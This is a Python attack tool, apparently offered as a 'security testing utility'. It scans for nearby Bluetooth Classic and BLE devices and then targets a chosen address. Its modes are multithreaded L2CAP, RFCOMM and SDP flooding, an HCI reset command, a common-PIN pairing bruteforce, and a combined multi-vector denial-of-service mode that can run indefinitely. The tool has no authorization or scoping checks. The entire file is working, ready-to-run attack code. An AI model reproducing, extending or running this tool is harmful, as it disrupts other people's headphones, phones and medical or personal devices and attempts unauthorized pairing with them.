#!/usr/bin/env python3
"""
Bluetooth Deauth Tool v2.0
Supports Bluetooth Classic and BLE testing & attack vectors
Author: Security Research Tool
"""

import os
import sys
import time
import random
import struct
import threading
import argparse
import subprocess
import re
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

# Bluetooth Classic (PyBluez)
BLUETOOTH_AVAILABLE = False
BT_RAW_AVAILABLE = False
try:
    import bluetooth
    BLUETOOTH_AVAILABLE = True
    try:
        import bluetooth._bluetooth as _bt
        BT_RAW_AVAILABLE = True
    except (ImportError, AttributeError):
        pass
except ImportError:
    pass

# Bluetooth Low Energy (Bleak)
BLEAK_AVAILABLE = False
try:
    import bleak
    import asyncio
    BLEAK_AVAILABLE = True
except ImportError:
    pass

# Scapy
SCAPY_AVAILABLE = False
try:
    from scapy.layers.bluetooth import *
    from scapy.all import conf
    SCAPY_AVAILABLE = True
except ImportError:
    pass

# Terminal Colors
try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    class DummyColor:
        def __getattr__(self, name):
            return ''
    Fore = Style = DummyColor()

# Global statistics
stats = {
    'packets_sent': 0,
    'attacks_launched': 0,
    'start_time': None,
    'running': False
}
stats_lock = threading.Lock()


def is_valid_mac(addr):
    """Validate Bluetooth MAC address format"""
    return bool(re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', addr))


def check_privileges():
    """Check if script has administrative/root privileges"""
    if hasattr(os, 'geteuid'):
        return os.geteuid() == 0
    elif sys.platform == 'win32':
        try:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except Exception:
            return False
    return False


class BluetoothDeauth:
    def __init__(self, interface='hci0'):
        self.interface = interface
        self.verbose = False
        
    def log(self, message, level='INFO'):
        """Print colored log messages with timestamp"""
        timestamp = datetime.now().strftime('%H:%M:%S')
        colors = {
            'INFO': Fore.CYAN,
            'SUCCESS': Fore.GREEN,
            'WARNING': Fore.YELLOW,
            'ERROR': Fore.RED,
            'ATTACK': Fore.MAGENTA
        }
        color = colors.get(level, Fore.WHITE)
        print(f"[{timestamp}] {color}[{level}]{Style.RESET_ALL} {message}")
    
    def scan_classic(self, duration=10):
        """Scan for Bluetooth Classic devices"""
        if not BLUETOOTH_AVAILABLE:
            self.log("PyBluez library is not available. Install it with: pip install pybluez", 'ERROR')
            return []

        self.log(f"Scanning for Bluetooth Classic devices ({duration}s)...", 'INFO')
        try:
            devices = bluetooth.discover_devices(
                duration=duration,
                lookup_names=True,
                lookup_class=True
            )
            
            if not devices:
                self.log("No Classic Bluetooth devices found", 'WARNING')
                return []
            
            self.log(f"Found {len(devices)} device(s)", 'SUCCESS')
            results = []
            for addr, name, device_class in devices:
                dev_info = {
                    'address': addr,
                    'name': name or 'Unknown',
                    'class': device_class,
                    'type': 'Classic'
                }
                results.append(dev_info)
                print(f"  {Fore.YELLOW}{addr}{Style.RESET_ALL} - {dev_info['name']} (Class: {device_class})")
            
            return results
            
        except Exception as e:
            self.log(f"Classic scan error: {e}", 'ERROR')
            return []
    
    def scan_ble(self, duration=10):
        """Scan for Bluetooth Low Energy (BLE) devices"""
        if not BLEAK_AVAILABLE:
            self.log("Bleak library is not available. Install it with: pip install bleak", 'ERROR')
            return []

        self.log(f"Scanning for BLE devices ({duration}s)...", 'INFO')

        async def _run_scan():
            scanner = bleak.BleakScanner()
            discovered = await scanner.discover(timeout=duration, return_adv=True)
            return discovered

        try:
            try:
                loop = asyncio.get_event_loop()
                if loop.is_running():
                    import nest_asyncio
                    nest_asyncio.apply()
                    discovered = loop.run_until_complete(_run_scan())
                else:
                    discovered = asyncio.run(_run_scan())
            except RuntimeError:
                discovered = asyncio.run(_run_scan())

            if not discovered:
                self.log("No BLE devices found", 'WARNING')
                return []

            self.log(f"Found {len(discovered)} BLE device(s)", 'SUCCESS')
            results = []
            for addr, (dev, adv) in discovered.items():
                name = dev.name or adv.local_name or 'Unknown'
                rssi = adv.rssi
                results.append({
                    'address': addr,
                    'name': name,
                    'rssi': rssi,
                    'type': 'BLE'
                })
                print(f"  {Fore.MAGENTA}{addr}{Style.RESET_ALL} - {name} (RSSI: {rssi} dBm)")
            return results

        except Exception as e:
            self.log(f"BLE scan error: {e}", 'ERROR')
            return []

    def _l2cap_worker(self, target_addr, port, count, delay, end_time):
        """Worker thread for L2CAP packet flooding"""
        sent = 0
        while stats['running'] and (count == 0 or sent < count):
            if end_time and time.time() >= end_time:
                break
            sock = None
            try:
                sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
                sock.settimeout(1)
                sock.connect((target_addr, port))
                
                # Send malformed/random junk data
                junk = os.urandom(random.randint(10, 100))
                sock.send(junk)
                
                sent += 1
                with stats_lock:
                    stats['packets_sent'] += 1
                
                if self.verbose and sent % 100 == 0:
                    self.log(f"[L2CAP] Sent {sent} packets to {target_addr}:{port}", 'INFO')
                
                time.sleep(delay)
            except Exception as e:
                if self.verbose and sent % 50 == 0:
                    self.log(f"[L2CAP] Connection attempt info: {e}", 'WARNING')
                sent += 1
                with stats_lock:
                    stats['packets_sent'] += 1
                time.sleep(delay * 2)
            finally:
                if sock:
                    try:
                        sock.close()
                    except Exception:
                        pass

    def l2cap_flood(self, target_addr, port=1, count=0, duration=0, threads=1, delay=0.001):
        """Flood target with L2CAP connection requests across multiple threads"""
        if not BLUETOOTH_AVAILABLE:
            self.log("PyBluez is required for L2CAP flood.", 'ERROR')
            return

        self.log(f"Starting L2CAP flood on {target_addr} (Port: {port}, Threads: {threads})", 'ATTACK')
        end_time = (time.time() + duration) if duration > 0 else None
        
        thread_list = []
        for _ in range(max(1, threads)):
            t = threading.Thread(
                target=self._l2cap_worker,
                args=(target_addr, port, count, delay, end_time)
            )
            t.daemon = True
            t.start()
            thread_list.append(t)

        for t in thread_list:
            t.join()

        self.log(f"L2CAP flood finished on {target_addr}", 'SUCCESS')

    def _rfcomm_worker(self, target_addr, channels, count, end_time):
        """Worker thread for RFCOMM channel flooding"""
        sent = 0
        while stats['running'] and (count == 0 or sent < count):
            if end_time and time.time() >= end_time:
                break
            for channel in channels:
                if not stats['running'] or (end_time and time.time() >= end_time):
                    break
                sock = None
                try:
                    sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
                    sock.settimeout(1.5)
                    sock.connect((target_addr, channel))
                    
                    # Send AT command noise / malformed commands
                    sock.send(b'AT+CMGS=\r\n' + os.urandom(20))
                    sent += 1
                    with stats_lock:
                        stats['packets_sent'] += 1
                except Exception:
                    sent += 1
                    with stats_lock:
                        stats['packets_sent'] += 1
                finally:
                    if sock:
                        try:
                            sock.close()
                        except Exception:
                            pass

    def rfcomm_flood(self, target_addr, channels=None, count=0, duration=0, threads=1):
        """Flood RFCOMM channels with connection attempts and malformed packets"""
        if not BLUETOOTH_AVAILABLE:
            self.log("PyBluez is required for RFCOMM flood.", 'ERROR')
            return

        if channels is None:
            channels = list(range(1, 31))
        elif isinstance(channels, int):
            channels = [channels]

        self.log(f"Starting RFCOMM flood on {target_addr} (Channels: {channels[:5]}..., Threads: {threads})", 'ATTACK')
        end_time = (time.time() + duration) if duration > 0 else None

        thread_list = []
        for _ in range(max(1, threads)):
            t = threading.Thread(
                target=self._rfcomm_worker,
                args=(target_addr, channels, count, end_time)
            )
            t.daemon = True
            t.start()
            thread_list.append(t)

        for t in thread_list:
            t.join()

        self.log(f"RFCOMM flood finished on {target_addr}", 'SUCCESS')

    def _sdp_worker(self, target_addr, count, end_time):
        """Worker thread for Service Discovery Protocol query flood"""
        sent = 0
        while stats['running'] and (count == 0 or sent < count):
            if end_time and time.time() >= end_time:
                break
            try:
                services = bluetooth.find_service(address=target_addr)
                num = len(services) if services else 1
                sent += num
                with stats_lock:
                    stats['packets_sent'] += num
            except Exception:
                sent += 1
                with stats_lock:
                    stats['packets_sent'] += 1
            
            if sent % 50 == 0:
                time.sleep(0.01)

    def service_discovery_attack(self, target_addr, count=0, duration=0, threads=1):
        """Overload target with service discovery (SDP) requests"""
        if not BLUETOOTH_AVAILABLE:
            self.log("PyBluez is required for SDP attack.", 'ERROR')
            return

        self.log(f"Starting SDP attack on {target_addr} (Threads: {threads})", 'ATTACK')
        end_time = (time.time() + duration) if duration > 0 else None

        thread_list = []
        for _ in range(max(1, threads)):
            t = threading.Thread(
                target=self._sdp_worker,
                args=(target_addr, count, end_time)
            )
            t.daemon = True
            t.start()
            thread_list.append(t)

        for t in thread_list:
            t.join()

        self.log(f"SDP attack finished on {target_addr}", 'SUCCESS')

    def hci_reset_attack(self, target_addr=None):
        """Attempt to reset local/target HCI controller"""
        self.log(f"Attempting HCI reset on interface {self.interface}", 'ATTACK')
        
        if not BT_RAW_AVAILABLE:
            self.log("Raw HCI sockets (_bluetooth) not available on this platform/configuration", 'ERROR')
            return

        try:
            dev_id = 0
            if isinstance(self.interface, str) and self.interface.startswith('hci'):
                try:
                    dev_id = int(self.interface.replace('hci', ''))
                except ValueError:
                    dev_id = 0
            
            # Open raw HCI socket
            sock = _bt.hci_open_dev(dev_id)
            
            # Create HCI reset command:
            # Packet Type (0x01 = HCI Command Packet)
            # Opcode 0x0c03 (OCF=0x0003, OGF=0x03)
            # Param length 0x00
            reset_cmd = struct.pack('<BHB', 0x01, 0x0c03, 0x00)
            
            sock.send(reset_cmd)
            sock.close()
            
            with stats_lock:
                stats['packets_sent'] += 1
            self.log("HCI reset command sent successfully", 'SUCCESS')
            
        except Exception as e:
            self.log(f"HCI reset failed: {e}", 'ERROR')

    def pin_bruteforce(self, target_addr, pin_list=None):
        """Attempt PIN bruteforce (for legacy Bluetooth pairing devices)"""
        if pin_list is None:
            pin_list = ['0000', '1234', '1111', '000000', '123456', '8888', '9999']
        
        self.log(f"Starting PIN bruteforce on {target_addr} ({len(pin_list)} common PINs)", 'ATTACK')
        
        for pin in pin_list:
            if not stats['running']:
                break
            try:
                self.log(f"Trying PIN: {pin}...", 'INFO')
                result = subprocess.run(
                    ['bluetoothctl', 'pair', target_addr],
                    input=f"{pin}\nquit\n".encode(),
                    capture_output=True,
                    timeout=10
                )
                
                with stats_lock:
                    stats['packets_sent'] += 1
                
                if b'Pairing successful' in result.stdout:
                    self.log(f"Pairing successful! PIN found: {pin}", 'SUCCESS')
                    return pin
            except FileNotFoundError:
                self.log("'bluetoothctl' utility not found. PIN bruteforce requires Linux BlueZ bluetoothctl.", 'ERROR')
                break
            except Exception as e:
                if self.verbose:
                    self.log(f"PIN attempt {pin} error: {e}", 'WARNING')
                continue
        
        self.log("PIN bruteforce completed", 'INFO')
        return None

    def multi_vector_attack(self, target_addr, duration=60, threads=5):
        """Launch multiple attack vectors simultaneously"""
        self.log(f"Launching multi-vector attack on {target_addr} (Duration: {duration}s, Total Threads: {threads * 3})", 'ATTACK')
        
        end_time = time.time() + duration if duration > 0 else None
        attacks = []
        
        for _ in range(max(1, threads)):
            attacks.append(threading.Thread(
                target=self._l2cap_worker,
                args=(target_addr, 1, 0, 0.001, end_time)
            ))
            attacks.append(threading.Thread(
                target=self._rfcomm_worker,
                args=(target_addr, list(range(1, 31)), 0, end_time)
            ))
            attacks.append(threading.Thread(
                target=self._sdp_worker,
                args=(target_addr, 0, end_time)
            ))
        
        for t in attacks:
            t.daemon = True
            t.start()
        
        start_time = time.time()
        while stats['running'] and (duration == 0 or (time.time() - start_time < duration)):
            time.sleep(0.5)
        
        stats['running'] = False
        for t in attacks:
            t.join(timeout=2)
        
        self.log("Multi-vector attack completed", 'SUCCESS')

    def show_stats(self):
        """Display attack statistics"""
        if stats['start_time']:
            elapsed = time.time() - stats['start_time']
            pps = stats['packets_sent'] / elapsed if elapsed > 0 else 0
            
            print(f"\n{Fore.CYAN}=== Attack Statistics ==={Style.RESET_ALL}")
            print(f"Duration:      {elapsed:.2f} seconds")
            print(f"Packets/Reqs:  {stats['packets_sent']}")
            print(f"Rate:          {pps:.2f} requests/second")
            print(f"{Fore.CYAN}========================{Style.RESET_ALL}\n")


def main():
    parser = argparse.ArgumentParser(
        description='Bluetooth Deauth Tool - Security Testing Utility',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  python deauth.py --scan
  python deauth.py --scan-ble
  python deauth.py -t AA:BB:CC:DD:EE:FF --l2cap -d 60
  python deauth.py -t AA:BB:CC:DD:EE:FF --rfcomm --threads 10
  python deauth.py -t AA:BB:CC:DD:EE:FF --sdp -d 30
  python deauth.py -t AA:BB:CC:DD:EE:FF --hci-reset
  python deauth.py -t AA:BB:CC:DD:EE:FF --pin
  python deauth.py -t AA:BB:CC:DD:EE:FF --multi -d 120 --threads 5
        '''
    )
    
    parser.add_argument('-t', '--target', help='Target Bluetooth address (XX:XX:XX:XX:XX:XX)')
    parser.add_argument('-i', '--interface', default='hci0', help='Bluetooth interface (default: hci0)')
    parser.add_argument('--scan', action='store_true', help='Scan for Bluetooth Classic devices')
    parser.add_argument('--scan-ble', action='store_true', help='Scan for Bluetooth Low Energy (BLE) devices')
    parser.add_argument('--l2cap', action='store_true', help='L2CAP flooding attack')
    parser.add_argument('--rfcomm', action='store_true', help='RFCOMM flooding attack')
    parser.add_argument('--sdp', action='store_true', help='SDP service discovery attack')
    parser.add_argument('--hci-reset', action='store_true', help='HCI reset command attack')
    parser.add_argument('--pin', action='store_true', help='PIN bruteforce for legacy devices')
    parser.add_argument('--multi', action='store_true', help='Multi-vector attack (L2CAP + RFCOMM + SDP)')
    parser.add_argument('-p', '--port', type=int, default=1, help='L2CAP PSM port (default: 1)')
    parser.add_argument('-c', '--channel', type=int, default=None, help='RFCOMM channel (default: 1-30)')
    parser.add_argument('-d', '--duration', type=int, default=60, help='Attack/Scan duration in seconds (default: 60, 0 for infinite)')
    parser.add_argument('--count', type=int, default=0, help='Number of packets/queries to send (default: 0 for duration-based)')
    parser.add_argument('--threads', type=int, default=5, help='Number of worker threads (default: 5)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    
    # Check administrator/root privileges
    if not check_privileges():
        print(f"{Fore.YELLOW}Warning: Root/Administrator privileges recommended for raw Bluetooth operations{Style.RESET_ALL}")
    
    tool = BluetoothDeauth(interface=args.interface)
    tool.verbose = args.verbose
    
    # Scan modes
    if args.scan:
        devices = tool.scan_classic(duration=min(args.duration, 30) if args.duration > 0 else 10)
        if devices:
            print(f"\n{Fore.GREEN}Discovered {len(devices)} Bluetooth Classic device(s){Style.RESET_ALL}")
        return

    if args.scan_ble:
        devices = tool.scan_ble(duration=min(args.duration, 30) if args.duration > 0 else 10)
        if devices:
            print(f"\n{Fore.GREEN}Discovered {len(devices)} BLE device(s){Style.RESET_ALL}")
        return
    
    # Attack modes require target address (except HCI reset which can target local controller)
    if not args.target and not args.hci_reset:
        parser.error('Target address required for attacks (--target / -t)')
    
    # Validate MAC address format if provided
    if args.target and not is_valid_mac(args.target):
        parser.error('Invalid MAC address format. Expected format: XX:XX:XX:XX:XX:XX')
    
    # Initialize global stats
    stats['running'] = True
    stats['start_time'] = time.time()
    
    # Set up interrupt handler
    def signal_handler(sig, frame):
        print(f"\n{Fore.YELLOW}Stopping attacks...{Style.RESET_ALL}")
        stats['running'] = False
        tool.show_stats()
        sys.exit(0)
    
    import signal
    signal.signal(signal.SIGINT, signal_handler)
    
    # Launch attack vectors
    try:
        if args.multi:
            tool.multi_vector_attack(args.target, duration=args.duration, threads=args.threads)
        elif args.l2cap:
            tool.l2cap_flood(args.target, port=args.port, count=args.count, duration=args.duration, threads=args.threads)
        elif args.rfcomm:
            channels = args.channel if args.channel is not None else None
            tool.rfcomm_flood(args.target, channels=channels, count=args.count, duration=args.duration, threads=args.threads)
        elif args.sdp:
            tool.service_discovery_attack(args.target, count=args.count, duration=args.duration, threads=args.threads)
        elif args.hci_reset:
            tool.hci_reset_attack(args.target)
        elif args.pin:
            tool.pin_bruteforce(args.target)
        else:
            # Default to multi-vector if attack was triggered with target
            tool.multi_vector_attack(args.target, duration=args.duration, threads=args.threads)
    except KeyboardInterrupt:
        pass
    finally:
        stats['running'] = False
        tool.show_stats()


if __name__ == '__main__':
    main()